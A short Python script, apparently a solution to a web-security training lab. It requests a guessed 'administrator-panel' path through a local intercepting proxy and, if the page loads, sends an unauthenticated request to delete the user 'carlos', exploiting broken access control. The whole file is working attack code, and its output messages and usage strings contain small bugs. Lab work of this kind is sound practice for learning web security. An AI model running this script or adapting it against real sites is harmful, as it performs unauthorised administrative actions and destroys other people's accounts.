import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def find_admin_panel(url):
    admin_panel_url = url + "administrator-panel" # Here we can make usr of a wordlist that can be used to search through a wordlists and help us to get the admin panel
    r = requests.get(admin_panel_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        return True, admin_panel_url
    return False, '404'

def delete_carlos(url):
    delete_carlos_url = url + 'delete?username=carlos'
    r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("Deleted the user carlos!")
    else:
        print("Could not delete the user carlos")
    sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("Usage:%s<url>", sys.argv[0])
        print("Example:%swww.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    print("Searching for an admin panel")
    admin_panel_bool,  admin_panel_url = find_admin_panel(url)
    if admin_panel_bool == True:
        print("Deleting carlost user")
        delete_carlos(admin_panel_url + '/')
        print("Deleted carlos")
        sys.exit(-1)
    else:
        print("Admin panel not found for this website")
        sys.exit(-1)

if __name__ == "__main__":
    main()